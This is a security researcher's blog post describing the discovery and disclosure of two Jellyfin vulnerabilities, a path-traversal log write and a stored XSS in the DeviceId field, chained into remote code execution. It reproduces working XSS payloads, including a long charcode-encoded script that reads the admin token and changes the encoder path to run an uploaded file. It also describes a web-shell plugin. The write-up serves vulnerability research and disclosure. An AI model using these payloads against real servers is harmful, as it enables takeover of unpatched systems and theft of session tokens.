<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://gebir.ge/blog/peanut-butter-jellyfin-time/">Original</a>
    <h1>Peanut Butter Jellyfin Time</h1>
    
    <div id="readability-page-1" class="page"><p>
&#34;But what is best is what we saved for last. The one sure-fire thing to make your best day ever the best day ever!&#34;</p><p>I always thought of getting a <code>CVE</code> as information security‚Äôs rite of passage. Which is probably shallow reasoning, but the symbolic value can‚Äôt be denied.</p><p>Because I really love this stuff, I decided to treat myself to my very first <code>CVE</code>! Not to please some hiring manager or human resource department, but simply to create a sense of belonging.</p><p>The following article highlights the discovery process for <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30626">CVE-2023-30626</a> and <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30627">CVE-2023-30627</a>, which combined with a low-privileged user account allow for remote code execution on any unpatched <code>Jellyfin</code> instance.</p><p>We‚Äôre going to talk about my approach, <code>Jellyfin&#39;s</code> internals and of course the two vulnerabilities themselves.</p><p>I‚Äôm not interested in only popping alert boxes or dropping <code>pwn.txt</code> files<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, but rather getting to know the application and creating the most impactful exploit I possibly can.</p><p>It‚Äôs part of the holy <em>Media Server Triforce</em>, the two other options being <code>Plex</code> and <code>Emby</code>. <code>Jellyfin</code> is actually a fork of the latter, right before it became closed-source. You can learn more about the history of the project <a href="https://jellyfin.org/docs/general/about/">here</a>.</p><p>While I don‚Äôt personally use <code>Jellyfin</code><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, I‚Äôm still really impressed by the scope of the project. It just goes to show what can be achieved in the open source space with a core team and the help of numerous contributors.</p><p>Because it‚Äôs a fork, there‚Äôs a huge amount of legacy code and technical depth that accumulated over time.
While working in such a codebase, the decision between breaking backwards compatibility and simply <em>rolling with it</em> frequently comes up.</p><p>From a security perspective, this is especially interesting. All those seams between new and old are a perfect place to look for little exploitable cracks.</p><p><code>Jellyfin</code> has numerous <a href="https://jellyfin.org/downloads/clients/">clients</a>, but the only one we‚Äôre talking about is the web client, which comes bundled with the installation by default.</p><p>Our main focus, however, lies on the server itself. It‚Äôs an <a href="https://learn.microsoft.com/en-us/aspnet/core/introduction-to-aspnet-core?view=aspnetcore-7.0">ASP.NET Core</a> application written in <code>C#</code>, which is one of the reasons why I‚Äôve picked <code>Jellyfin</code> as my research project. I feel rather comfortable in that environment.</p><p><code>Jellyfin</code> can be installed on a variety of hosts. When not stated otherwise, assume the <code>Windows</code> build for this article.</p><p>There, I said it. The bad word. Talking about methodology is like talking about one‚Äôs blogging setup. Both are highly subjective and individual topics. I feel like time may be better spend on more <em>concrete</em> topics.</p><p>Of course that‚Äôs not true at all! We can always learn by looking at how other people do things<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. Mixing and matching of different techniques and approaches oftentimes enables us to look at a problem from a different angle.</p><p>Even though my previous research approach was more <em>laissez-faire</em>, I‚Äôve still taken notes like a good boy. Not because I love optimization and hate having fun. But because wasting time has nothing to do with having fun!</p><p>Those notes enabled me to do some planning based on what did and did not work before.</p><p><code>Jellyfin</code> being an open source project makes the process a lot simpler. We have the original source code, which greatly simplifies static analysis. We can also easily set up a development environment<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, which aids with dynamic analysis.</p><p>Moreover, things like the aforementioned <code>Github</code> issues are a treasure trove of past bugs, with varying degrees of security implications. I feel like those are even more important than the previous <code>CVEs</code>, simply because many issues may be nothing more than an annoying bug for the reporter, but could actually be an indication of a more systemic issue.</p><p>If nothing else, we can get a feel for where to focus our attention.</p><p><code>Jellyfin&#39;s</code> codebase is quite big, so we need to do exactly that: Focus our attention on a specific sub-system. A <code>REST API</code> is <strong>always</strong> interesting, so let‚Äôs check it out.</p><p><code>ASP.NET</code> provides a nice way of annotating individual endpoints with the <code>[Authorize]</code> <a href="https://learn.microsoft.com/en-us/aspnet/web-api/overview/security/authentication-and-authorization-in-aspnet-web-api#using-the-authorize-attribute">attribute</a>, which makes it immediately clear what kind of restrictions are imposed on any given route.</p><p>At first I‚Äôve only looked at endpoints that can be reached unauthenticated. But given <em>a little</em> more access in the form of a low-privileged user, we can dramatically expand the attack surface.</p><p>That‚Äôs all dandy, but how do we authenticate ourselves against the <code>API</code> in practice? Just by looking at the documentation, it wasn‚Äôt really clear to me how to do it. Thankfully, I‚Äôve found <a href="https://jmshrv.com/posts/jellyfin-api/">this</a> useful article.</p><p>The value of the latter is an actual session token as one would expect. But the value of the former is a little funky:</p><div><pre tabindex="0"><code data-lang="text"><span><span> MediaBrowser Client=&#34;Jellyfin Web&#34;, Device=&#34;Firefox&#34;, DeviceId=&#34;TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo5&#34;, Version=&#34;10.8.9&#34;, Token=&#34;&lt;your-session-token&gt;&#34;
</span></span></code></pre></div><p>A rather unusual <code>Authorization</code> header, that‚Äôs for sure. When used for authentication, those values end up in an <a href="https://github.com/jellyfin/jellyfin/blob/a3c9edde347122437e988aac9eb5dacb08f0c345/MediaBrowser.Controller/Session/AuthenticationRequest.cs">AuthenticationRequest</a>, which stores the details of the session. But what makes it more than a curiosity is the fact that many of these value are implicitly trusted all over the codebase. Let‚Äôs have a look at an example.</p><p><code>Jellyfin</code> has an <a href="https://github.com/jellyfin/jellyfin/blob/22d880662283980dec994cd7d35fe269613bfce3/Jellyfin.Api/Controllers/ClientLogController.cs#L44">endpoint</a> that allows clients to upload log files. It is enabled by default. The <code>POST</code> request‚Äôs body gets copied to the file <em>as is</em>.</p><p>A malicious user has control over every parameter via the <code>Authorization</code> header! The two strings are being interpolated into a filename in line 3. Said filename gets combined with a base path for log files into the final path.</p><p>When creating a session, we specified a <code>clientName</code> of <code>\..\..\ROFL</code>. This will let us write the file <em>one</em> directory above the intended one.
But why do we have to reference the parent <em>two</em> times?</p><p>Well, the first slash terminates the mandatory <code>upload_</code> prefix, which makes it a directory. We then reference the ‚Äúparent‚Äù, which gets rid of the fake <code>upload_</code> directory entirely. One more pair of dots finally allow us to break out of the logging directory.</p><p>It looks like this particular issue was introduced <a href="https://github.com/jellyfin/jellyfin/commit/c534c450330759f6595c9601e3fe8b12e6987e69#diff-2cea0a137aa1c0d17dc7d9fa3067b048dce5a5be11e5e3bda33ea5fccb819ab0">here</a> and merged into master <a href="https://github.com/jellyfin/jellyfin/pull/5918#event-5580709083">here</a>, which makes it present since version <code>v10.8.0-alpha2</code>.</p><p>Alright, we have a file write with partially controlled name and <strong>fully</strong> controlled content. The only restriction is a 1MB limit for the content.</p><p>I‚Äôve tried quite a lot of things in order to exploit the file write. Feel free to skip the next couple of sections of trial and error. Feel even <em>more</em> free to tell <a href="https://solar.lowtechmagazine.com/about">me</a> about your ideas!</p><p>If we could control where the filename gets terminated, we‚Äôd be able to provide our own extension. Sadly that‚Äôs not possible, as the <code>NUL</code> byte aka <code>\0</code> counts as an <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.path.getinvalidpathchars?view=net-7.0#remarks">invalid</a> path character.</p><p>We could try something funny with <code>Unicode</code> (ü§°), but let‚Äôs just accept the <code>.log</code> extension for the moment.</p><p>A great first choice is staying inside the <code>Jellyfin</code> ecosystem, so I‚Äôve looked into their <a href="https://jellyfin.org/docs/general/server/plugins/">plugin system</a>. They use auto-discovery of <code>DLLs</code> in the process of loading plugins, which ultimately brings us to <a href="https://github.com/jellyfin/jellyfin/blob/22d880662283980dec994cd7d35fe269613bfce3/Emby.Server.Implementations/Plugins/PluginManager.cs#L666">DiscoverPlugins()</a>.</p><p>The first obstacle: Only sub directories of the <code>plugin</code> directory get enumerated. We can only write a file, not create a directory, though. But wait, there‚Äôs already a <code>config</code> folder present by default! That‚Äôll work, but our hopes get shattered a few lines later:</p><div><pre tabindex="0"><code data-lang="csharp"><span><span> entry.DllFiles = Directory.GetFiles(entry.Path, <span>&#34;*.dll&#34;</span>, SearchOption.AllDirectories);
</span></span></code></pre></div><p>Only files ending in <code>.dll</code> are picked up, huh.</p><p>So while learning about the plugins didn‚Äôt yield immediate results, we‚Äôre going the apply that knowledge later.</p><p>Next up a classic: Putting a file into the user‚Äôs autostart directory. We <em>can</em> write into it, but because <code>Windows</code> places a lot of importance on file extensions, only <code>Notepad</code> will pop up and display our <code>.log</code> file. I guess we could mount a social engineering attack:</p><p>100% guaranteed, every time ü§•.</p><p>I really thought having full control over the content and partial control over the name would be an easy win.</p><p>It turns out the other way around would be simpler to exploit, as demonstrated by Stephen R√∂ttger in his <a href="https://googleprojectzero.blogspot.com/2020/02/escaping-chrome-sandbox-with-ridl.html">Chrome sandbox escape</a>. He writes a cookie file, which is basically a <code>SQLite</code> database, into the autostart directory and inserts a command disguised as a cookie. Because he controls the extension (<code>.bat</code>), <code>Windows</code> will execute the command-as-cookie inside the <code>SQLite</code> database file just fine. Brilliant!</p><p>We‚Äôve hit a dead end on <code>Windows</code>, so maybe focusing on another operating system is the right move. There‚Äôs an official <code>Docker</code> image and while the installation instructions mention the possibility of running as an unprivileged user, running as <em>superprivileged</em> <code>root</code> is still the default.</p><p>Because we‚Äôre <code>root</code>, we can write <strong>anywhere</strong>. So what are our options?</p><p>Linux has the <code>~/.config/autorun</code> directory. Usually, <code>.desktop</code> files reside there specifying which applications to run on startup. But no luck: It turns out the extension <em>has</em> to be <code>.desktop</code>!</p><p>Another option is writing <a href="https://unix.stackexchange.com/a/458715">crontab snippets</a> directly into the <code>/etc/cron.d</code> directory, which could make scheduling the execution of another binary dropped by us via the <code>/ClientLog/Document</code> endpoint possible.</p><p>I would‚Äôve been really devastated if the very idea wasn‚Äôt flawed to begin with.</p><p>We‚Äôre still inside a container, where only <strong>one</strong> process gets executed on startup anyway. So without fiddling around, no cron jobs are executed.</p><p>A <em>lot</em> of dead ends. Yeah, yeah, we gained precious knowledge - It‚Äôs true!</p><p>But I didn‚Äôt want to give up just yet. We have to achieve the ultimate goal in life:</p><p>It looks like our file write alone is not enough. What would be enough, though?</p><p>Looking through the endpoints, it became clear that an admin account can do <strong>a lot</strong> of interesting things. Not quite executing code, but close enough.</p><p>Because of that powerful <code>API</code>, all we realistically need is a <code>XSS</code> vulnerability inside the web client. So let‚Äôs find one!</p><p>There are two relatively new <code>CVEs</code> for <code>XSS</code> issues in the web client, so maybe we‚Äôre onto something.</p><p>We know that the session values from the <code>Authorization</code> header are implicitly trusted all over the codebase. Maybe that‚Äôs also the case for the web client?
Looking around the admin dashboard, we can see the <code>Devices</code> section:</p><p>Oh oh. The plus sign. Cross-site scripting‚Äôs best friend.</p><p>This really is a textbook example of a <code>Stored XSS</code> vulnerability. They‚Äôve been escaping strings <a href="https://github.com/jellyfin/jellyfin-web/commit/59adbc348a37bccc8f9a277378e863efbe95497a">for some time</a> now. Not nearly enough, though!</p><p>Nice, that was a lot quicker than I imagined.</p><p>Digging around, it looks like the issue was present since at least <a href="https://github.com/jellyfin/jellyfin-web/commit/1c06eed0985da6bded90c3c26fb99a8ef61c3f86">here</a>, which would mean version <code>10.1.0</code> (the oldest release on <code>Github</code>).</p><p>In order to trigger the vulnerability, we can create a new session with a crafted <code>DeviceId</code>:</p><div><pre tabindex="0"><code data-lang="text"><span><span> [...] DeviceId=&#34;&#39; onmouseover=alert(document.domain) data-lol=&#39;&#34; [...]
</span></span></code></pre></div><p>We close the expected <code>HTML</code> attribute with a single quote, insert a malicious event handler attribute and finish with our own data-attribute that contains another single quote to match the closing quote from the expected attribute.</p><p>Attribute. Quote.</p><p>Doing anything fancier than an <code>alert()</code> proves to be difficult. That‚Äôs because all those values from the <code>Authorization</code> header get parsed by a scary looking piece of <a href="https://github.com/jellyfin/jellyfin/blob/3c22d5c9705921672a932192d016933ef5900001/Jellyfin.Server.Implementations/Security/AuthorizationContext.cs#L286">code</a>, which means we cannot easily use quotation marks.</p><p>Single quotes are also iffy, because we‚Äôre in the middle of said event handler attribute. Maybe something can be done with different encodings, but:
Dealing with encodings is never fun, so let‚Äôs make it easy for ourselves. Thankfully, inline scripts are not blocked via <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a>, which allows the usage of <code>eval()</code>.</p><p>In order to get around the quotation marks for the string <code>eval()</code> expects as an argument, we can use <code>String.fromCharCode()</code>:</p><div><pre tabindex="0"><code data-lang="text"><span><span> [...] DeviceId=&#34;&#39; onmouseover=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59)) data-lol=&#39;&#34; [...]
</span></span></code></pre></div><p>The payload is the same as above, but it certainly makes us look <em>way</em> more legit, right?</p><p>Our goal is still <code>RCE</code>.</p><p>The simplest way would be to enable a new package source and install a malicious plugin from there. While this should work with a couple of <code>API</code> calls, we‚Äôd need to host said repository somewhere.</p><p>The <code>REST API</code> features an endpoint for changing the <code>media encoder</code> (basically <code>ffmpeg</code>) path, probably out of necessity for the first-time setup.</p><p>Said encoder binary always runs <em>out of process</em>, meaning it gets started via <code>Process.Start()</code>. We already scanned the repository for it. Why? Because it‚Äôs always a potential vector for <code>RCE</code>.</p><p>Do you remember our file write from before? Forget about the directory traversal, all we need is the <em>unrestricted content</em> part.
Maybe we can trick <code>Jellyfin</code> into executing our malicious log file, even with the <code>.log</code> extension?</p><p>As luck has it, we can <strong>absolutely</strong> do that! Every time a new path is provided, it gets <a href="https://github.com/jellyfin/jellyfin/blob/4b2b46c8f3d98227b01d57cd3f4805e65ddac727/MediaBrowser.MediaEncoding/Encoder/MediaEncoder.cs#L270">validated</a>. Thankfully for us, validation involves <em>calling</em> the binary:</p><p>That‚Äôs really the best case scenario: Our own code runs, but validation fails and the actual media encoder doesn‚Äôt get replaced.</p><p>We could stop right here and execute some off-the-shelf payload, but let‚Äôs get even more convoluted!</p><p>Conceptually, we can think of our malicious log file as a <a href="https://en.wikipedia.org/wiki/Dropper%5F(malware)">dropper</a>. Wich makes sense for the 1MB limit we‚Äôre facing. It only contains the next stage and therefore looks rather simple:</p><p>I‚Äôve told you we‚Äôd make use of our plugin knowledge! Why a plugin? On my resume, I‚Äôd put:</p><p>But, you know, the reason is much simpler: I find it really funny.</p><p>The <code>Jellyfin</code> team provides a template <a href="https://github.com/jellyfin/jellyfin-plugin-template/blob/master/README.md">repository</a>. From the <code>README</code> we learn about all the different interfaces we can implement in order to add functionality.</p><p>As we‚Äôve already noted, the server uses auto-discovery-reflection-magic on startup to load plugins and provides different hooks for the code at runtime.</p><p>So what <em>is</em> inside our plugin <code>DLL</code>? Let‚Äôs start with the most straightforward part, an additional endpoint:</p><p>The above is a standard <code>ASP.NET</code> controller. Embedding external controllers is not a Jellything, but actually encouraged by <code>Microsoft&#39;s</code> official <a href="https://learn.microsoft.com/en-us/aspnet/core/mvc/advanced/app-parts?view=aspnetcore-7.0">documentation</a>.</p><p>We specify the route to our controller in line six and use part of the <code>URL</code> to execute a command on the server. You know, the usual <code>web shell</code> stuff.</p><p>We could, of course, add the almighty endpoint of the <a href="https://solar.lowtechmagazine.com/blog/privesc-part-2">previous</a> article, which would allow us to do slightly fancier <code>web shell</code> stuff.</p><p>Enough serious business! Let‚Äôs have some fun.</p><p>After seeing the <code>IIntroProvider</code> interface in the aforementioned plugin template repository, I was sold. Of <em>course</em> we‚Äôre using our ability to execute arbitrary code on the machine to let an annoying intro play before every other video.</p><p>In order for this to work, we need some preparation. Thankfully, there‚Äôs the <code>IServerEntryPoint</code> interface, which lets us run code on startup.</p><p>A few things are interesting here. In line 14, the intro is provided as a raw byte array as opposed to our usual <code>Base64</code> encoded string.</p><p>Remember: Our original dropper can only be 1MB. It contains the <code>DLL</code> and <em>it</em> contains the intro. Matryoshka style.</p><p>Without fetching any more resources, we‚Äôre quite limited in size. <code>Base64</code> has an average overhead of about 33%, which we simply cannot afford here!</p><p>Next up, lines 23 to 24 show how to dynamically retrieve important classes via <a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-7.0">dependency injection</a>. The details are not important, but suffice it to say we‚Äôre <em>deep</em> inside <code>Jellyfin</code> at this point.</p><p>Alright, we‚Äôve dropped our intro video and registered it. Let‚Äôs have a look at the final üß©, the <code>IntroProvider</code> itself:</p><p>Neither the <code>item</code> about to be played, nor the <code>user</code> requesting it are of interest to us. We always return the same intro that we registered in the previous step.</p><p>Here‚Äôs the <code>XSS</code> exploit that ties everything together.</p><p>A few API calls, an anonymous <code>async</code> function that gets called directly after its definition. Nothing too crazy.</p><p>As you remember, we want to pass that script to <code>eval()</code> via <code>String.fromCharCode()</code>. <code>CyberChef</code> got us <a href="https://gchq.github.io/CyberChef/#recipe=JavaScript%5FMinify()To%5FCharcode(&#39;Comma&#39;,10)&amp;input=KGFzeW5jIGZ1bmN0aW9uKCkgewpjb25zdCBncmFkaWVudCA9ICJiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTgwZGVnLCByZ2JhKDI1NSwgMCwgMCwgMSkgMCUsIHJnYmEoMjU1LCAyNTUsIDAsIDEpIDMzJSwgcmdiYSgwLCAxOTIsIDI1NSwgMSkgNjYlLCByZ2JhKDE5MiwgMCwgMjU1LCAxKSAxMDAlIjsKCmNvbnNvbGUud2FybigiJWMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBncmFkaWVudCk7CmNvbnNvbGUud2FybigKYCVjICAgICAgXyAgXwogIG8gICAgIC8vIC8vICAgICAgIC8pbyAgICAgICBvIF8vXwogLCAgXyAgLy8gLy8gX18gICwgLy8sICBfIF8gICwgIC8gIF9fCi98XygvXygvXygvXy8gKF8vXy8vXyhfLyAvIC9fKF8oX18oXykKLykgICAgICAgICAgICAgLyAvKQovICAgICAgICAgICAgICcgKC8gICAgICAgICAtLSBHRUJJUkdFICgyMDIzKQpgLCAiY29sb3I6ICNkMzM2ODIiKTsKY29uc29sZS53YXJuKCIlYyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIsIGdyYWRpZW50KTsKCmNvbnN0IHdpbGhlbG0gPSBuZXcgQXVkaW8oImh0dHBzOi8vdXBsb2FkLndpa2ltZWRpYS5vcmcvd2lraXBlZGlhL2NvbW1vbnMvZC9kOS9XaWxoZWxtX1NjcmVhbS5vZ2ciKTsKd2lsaGVsbS52b2x1bWUgPSAwLjI7CndpbGhlbG0ucGxheSgpOwpjb25zdCBjYXJkSW1hZ2VzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgiY2FyZEltYWdlIik7CmZvciAoY29uc3QgY2FyZEltYWdlIG9mIGNhcmRJbWFnZXMpIHsKICAgIGNhcmRJbWFnZS5zdHlsZS5iYWNrZ3JvdW5kSW1hZ2U9InVybChodHRwOi8vd3d3LnNoZXJ2Lm5ldC9jbS9lbW90aWNvbnMvdHJvbGxmYWNlL2JpZy10cm9sbC1zbWlsZXktZW1vdGljb24uanBlZykiOwp9CgovLyBUaGFua2Z1bGx5IHRoZSBhdXRoZW50aWNhdGlvbiB0b2tlbiBpcyBzdG9yZWQgaW5zaWRlIGxvY2FsU3RvcmFnZS4KY29uc3QgdG9rZW4gPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5qZWxseWZpbl9jcmVkZW50aWFscykuU2VydmVyc1swXS5BY2Nlc3NUb2tlbjsKCmNvbnN0IGJhc2VIZWFkZXJzID0gewogICAgIlgtRW1ieS1Ub2tlbiI6IHRva2VuLAp9OwoKLy8gV2UgbmVlZCB0aGUgZnVsbCBwYXRoIHRvIG91ciBtYWxpY2lvdXMgZXhlY3V0YWJsZS4KLy8gVGhlIGZpcnN0IHBhcnQgaXMgdGhlIGNvbmZpZ3VyZWQgcGF0aCBmb3IgbG9nIGZpbGVzLgpsZXQgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgiL1N5c3RlbS9JbmZvIiwgewogICAgaGVhZGVyczogYmFzZUhlYWRlcnMsCn0pOwpjb25zdCBzeXN0ZW1JbmZvID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwpjb25zdCBsb2dQYXRoID0gc3lzdGVtSW5mby5Mb2dQYXRoOwoKLy8gVGhlIHNlY29uZCBwYXJ0IGlzIHRoZSBmaWxlbmFtZSBpdHNlbGYuCi8vIEJlY2F1c2Ugd2UgZG9uJ3QgY29udHJvbCB0aGUgZnVsbCBmaWxlbmFtZSwgd2UgZmlsdGVyIGZvciBvdXIgbWFnaWMgc3Vic3RyaW5nLgpyZXNwb25zZSA9IGF3YWl0IGZldGNoKCIvU3lzdGVtL0xvZ3MiLCB7CiAgICBoZWFkZXJzOiBiYXNlSGVhZGVycwp9KTsKY29uc3QgbG9nRmlsZXMgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CmNvbnN0IG1hbGljaW91c0xvZ2ZpbGUgPSBsb2dGaWxlcy5maW5kKGwgPT4gbC5OYW1lLmluY2x1ZGVzKCJNQUdJQ19QV05fU1RSSU5HIikpLk5hbWU7Cgpjb25zdCBmdWxsUGF0aCA9IGAke2xvZ1BhdGh9XFwke21hbGljaW91c0xvZ2ZpbGV9YDsKCi8vIE5vdyB3ZSB0cnkgY2hhbmdpbmcgdGhlIGVuY29kZXIgcGF0aC4KLy8gVGhpcyB3b24ndCB3b3JrLCBidXQgb3VyIGJpbmFyeSB3aWxsIGFscmVhZHkgaGF2ZSBydW4gYXQgdGhpcyBwb2ludC4KY29uc3QgZW5jb2RlclJlcXVlc3QgPSB7CiAgICAiUGF0aCI6IGZ1bGxQYXRoLAogICAgIlBhdGhUeXBlIjogImN1c3RvbSIsCn07Cgphd2FpdCBmZXRjaCgiL1N5c3RlbS9NZWRpYUVuY29kZXIvUGF0aCIsIHsKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogewogICAgICAgIC4uLmJhc2VIZWFkZXJzLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoZW5jb2RlclJlcXVlc3QpLAp9KTsKCi8vIE91ciBtYWxpY2lvdXMgcGx1Z2luIG9ubHkgZ2V0cyBsb2FkZWQgb25jZSB0aGUgc2VydmVyIHJlc3RhcnRzLAovLyBzbyBsZXQncyBzaHV0IGl0IGRvd24gdG8gY3V0IHRoZSB3b3JrbG9hZCBpbiBoYWxmIDpeKS4KYXdhaXQgZmV0Y2goIi9TeXN0ZW0vU2h1dGRvd24iLCB7Cm1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogYmFzZUhlYWRlcnMsCn0pOwp9KSgpCg">covered</a>.</p><div><pre tabindex="0"><code data-lang="text"><span><span> MediaBrowser Client=&#34;MAGIC_PWN_STRING&#34;, Device=&#34;jellyfinito&#34;, DeviceId=&#34;&#39; onmouseenter=eval(String.fromCharCode(33,97,115,121,110,99,32,102,117,110,99,116,105,111,110,40,41,123,99,111,110,115,116,32,101,61,34,98,97,99,107,103,114,111,117,110,100,58,32,108,105,110,101,97,114,45,103,114,97,100,105,101,110,116,40,49,56,48,100,101,103,44,32,114,103,98,97,40,50,53,53,44,32,48,44,32,48,44,32,49,41,32,48,37,44,32,114,103,98,97,40,50,53,53,44,32,50,53,53,44,32,48,44,32,49,41,32,51,51,37,44,32,114,103,98,97,40,48,44,32,49,57,50,44,32,50,53,53,44,32,49,41,32,54,54,37,44,32,114,103,98,97,40,49,57,50,44,32,48,44,32,50,53,53,44,32,49,41,32,49,48,48,37,34,59,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,44,101,41,44,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,95,32,32,95,92,110,32,32,111,32,32,32,32,32,47,47,32,47,47,32,32,32,32,32,32,32,47,41,111,32,32,32,32,32,32,32,111,32,95,47,95,92,110,32,44,32,32,95,32,32,47,47,32,47,47,32,95,95,32,32,44,32,47,47,44,32,32,95,32,95,32,32,44,32,32,47,32,32,95,95,92,110,47,124,95,40,47,95,40,47,95,40,47,95,47,32,40,95,47,95,47,47,95,40,95,47,32,47,32,47,95,40,95,40,95,95,40,95,41,92,110,47,41,32,32,32,32,32,32,32,32,32,32,32,32,32,47,32,47,41,92,110,47,32,32,32,32,32,32,32,32,32,32,32,32,32,39,32,40,47,32,32,32,32,32,32,32,32,32,45,45,32,71,69,66,73,82,71,69,32,40,50,48,50,51,41,92,110,34,44,34,99,111,108,111,114,58,32,35,100,51,51,54,56,50,34,41,44,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,44,101,41,59,99,111,110,115,116,32,111,61,110,101,119,32,65,117,100,105,111,40,34,104,116,116,112,115,58,47,47,117,112,108,111,97,100,46,119,105,107,105,109,101,100,105,97,46,111,114,103,47,119,105,107,105,112,101,100,105,97,47,99,111,109,109,111,110,115,47,100,47,100,57,47,87,105,108,104,101,108,109,95,83,99,114,101,97,109,46,111,103,103,34,41,59,111,46,118,111,108,117,109,101,61,46,50,44,111,46,112,108,97,121,40,41,59,99,111,110,115,116,32,97,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,67,108,97,115,115,78,97,109,101,40,34,99,97,114,100,73,109,97,103,101,34,41,59,102,111,114,40,99,111,110,115,116,32,101,32,111,102,32,97,41,101,46,115,116,121,108,101,46,98,97,99,107,103,114,111,117,110,100,73,109,97,103,101,61,34,117,114,108,40,104,116,116,112,58,47,47,119,119,119,46,115,104,101,114,118,46,110,101,116,47,99,109,47,101,109,111,116,105,99,111,110,115,47,116,114,111,108,108,102,97,99,101,47,98,105,103,45,116,114,111,108,108,45,115,109,105,108,101,121,45,101,109,111,116,105,99,111,110,46,106,112,101,103,41,34,59,99,111,110,115,116,32,116,61,123,34,88,45,69,109,98,121,45,84,111,107,101,110,34,58,74,83,79,78,46,112,97,114,115,101,40,108,111,99,97,108,83,116,111,114,97,103,101,46,106,101,108,108,121,102,105,110,95,99,114,101,100,101,110,116,105,97,108,115,41,46,83,101,114,118,101,114,115,91,48,93,46,65,99,99,101,115,115,84,111,107,101,110,125,59,108,101,116,32,110,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,73,110,102,111,34,44,123,104,101,97,100,101,114,115,58,116,125,41,59,99,111,110,115,116,32,115,61,40,97,119,97,105,116,32,110,46,106,115,111,110,40,41,41,46,76,111,103,80,97,116,104,59,110,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,76,111,103,115,34,44,123,104,101,97,100,101,114,115,58,116,125,41,59,99,111,110,115,116,32,99,61,123,80,97,116,104,58,96,36,123,115,125,92,92,36,123,40,97,119,97,105,116,32,110,46,106,115,111,110,40,41,41,46,102,105,110,100,40,40,101,61,62,101,46,78,97,109,101,46,105,110,99,108,117,100,101,115,40,34,77,65,71,73,67,95,80,87,78,95,83,84,82,73,78,71,34,41,41,41,46,78,97,109,101,125,96,44,80,97,116,104,84,121,112,101,58,34,99,117,115,116,111,109,34,125,59,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,77,101,100,105,97,69,110,99,111,100,101,114,47,80,97,116,104,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,123,46,46,46,116,44,34,67,111,110,116,101,110,116,45,84,121,112,101,34,58,34,97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110,34,125,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,99,41,125,41,44,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,83,104,117,116,100,111,119,110,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,116,125,41,125,40,41,59)) data-lol=&#39;&#34;, Version=&#34;1337&#34;, Token=&#34;&#34;
</span></span></code></pre></div><p>After so many words it‚Äôs finally time to watch something. You‚Äôve earned it.</p><p>The video shows the exploitation process from the perspective of an administrative user.</p><p>I‚Äôve reported both vulnerabilities together with proof of concepts to the maintainers as per their <a href="https://github.com/jellyfin/jellyfin/security">security policy</a>. As a response, a <code>Github</code> security advisory and private fork of the repository were created, which gave me the chance to collaborate on the patches.</p><p>In the meantime, I continued to work on the presented <strong>RCE</strong> chain in order to show the real impact of those issues. And because it‚Äôs fun.</p><p>I also provided a patch which hasn‚Äôt been merged, because its implications are not easy to asses. That‚Äôs exactly what I‚Äôve alluded to at the beginning of the article:</p><p>Making the decision between breaking backwards compatibility and simply <em>rolling with it</em>.</p><p>So while the fixes don‚Äôt go far enough in my opinion, I completely understand the reasoning behind it<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>. And let‚Äôs not forget that these people work on <code>Jellyfin</code> in their spare time!</p><p>Properly dealing with user input is <strong>really</strong> hard. Especially if it creeps up in unexpected places.</p><p>Do we validate incoming data?
Do we validate outgoing data?
